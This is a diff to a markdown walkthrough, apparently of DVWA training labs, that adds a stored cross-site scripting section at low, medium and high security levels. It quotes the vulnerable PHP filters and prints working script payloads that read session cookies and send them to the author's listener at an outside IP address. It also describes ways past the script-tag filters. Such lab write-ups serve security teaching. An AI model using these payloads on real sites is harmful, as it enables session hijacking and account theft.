@@ -7,6 +7,8 @@ ncat -lkc "perl -e 'while (defined(\$x = <>)){ print STDERR \$x; last if \$x eq 
 # } print qq#HTTP/1.1 204 No Content\\r\\n#'" 8000
 ```
 
+### XSS (Reflected)
+
 *Security Level: low*
 
 Looking at the source code, we can see that there is no filtering of the user input:
@@ -139,3 +141,76 @@ This is essentially our payload after URL encoding. The `%3B` is the URL encodin
                                                                    ^^^
 ```
 If we now submit this URL, the page now renders a button, which when clicked executes our payload successfully!
+
+### XSS (Stored)
+
+*Security Level: low*
+
+We are now uploading our payload to be stored in a database, which is then included in a HTML document. Looking at the source code, we can see that our input is sanitized to prevent SQL injection, but has no guards against an XSS:
+
+```php
+// Sanitize message input
+$message = stripslashes( $message );
+$message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+
+// Sanitize name input
+$name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+
+// Update database
+$query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
+$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
+```
+
+This means we should be able to enter our payload from the previous section as either the name or message, and it should execute whenever the page is loaded, since all comments are displayed. One issue is that the text fields on the page only allow a fixed number of characters. One way around this is to send the post requests ourselves. We can encode our payload in url (using [this website](https://meyerweb.com/eric/tools/dencoder/)), and send the request.
+
+Unfortunately, I ran into an issue. Even if we send the POST requests ourselves, there still seems to be some kind of maximum size we can send (after some testing the largest POST request I was able to send had a content length of 522). This is really unfortunate as by default my payload was slightly longer than that. I was able to get the following payloads to work (after url encoding them and putting them in my post request):
+```html
+<script>
+function getCookie(name) {
+  const value = `; ${document.cookie}`;
+  const parts = value.split(`; ${name}=`);
+  if (parts.length === 2) return parts.pop().split(';').shift();
+}
+alert(getCookie("PHPSESSID"));
+</script>
+```
+
+```html
+<script>
+var msg = new XMLHttpRequest();
+var url = "http://10.6.66.64:8000";
+var params = "?cookies=";
+msg.open("GET", url+params+document.cookie, async=false);
+msg.send();
+</script>
+```
+
+However, combining them didn't work. I tried minifying my code by removing whitespace, like in the following payload. This was under the 522 length limit, but didn't work:
+```html
+<script>var msg= new XMLHttpRequest();var url="http://10.6.66.64:8000";function getCookie(name) {var value=`; ${document.cookie}`;var parts= value.split(`; ${name}=`);if (parts.length === 2) return parts.pop().split(';').shift();}msg.open("GET",url+"?PHPSESSID="+getCookie("PHPSESSID"),async=false);msg.send();</script>
+```
+
+For the remainder of these labs, I'll use the following payload, which simply sends all cookies to our fake web server.
+```html
+<script>var msg = new XMLHttpRequest();var url = 'http://10.6.66.64:8000';var params = '?cookies=';msg.open('GET', url+params+document.cookie, async=false);msg.send();</script>
+```
+
+*Security Level: medium*
+
+On this level, messages are now sanitized as follows
+```PHP
+$message = strip_tags( addslashes( $message ) );
+```
+The `strip_tags` function basically prevents any HTML injections. Luckily, the name field is sanitized differently:
+```PHP
+$name = str_replace( '<script>', '', $name );
+```
+This is the same as the *medium* level for the previous vulnerability, so any similar payload can work. Note that now the `name` field is the vulnerable one, so this is the field where we need to insert our payload instead of message. However, the maximum number of characters seems to be even smaller than for the message, so we can't use our previous payload.
+
+*Security Level: high*
+
+This level again reflects the previous category, with the same regex used to sanitize the name field.
+```PHP
+$name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name );
+```
+We can exploit this by using events to trigger javascript instead. An even larger list to the one I wrote previously can be found [**here**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet).
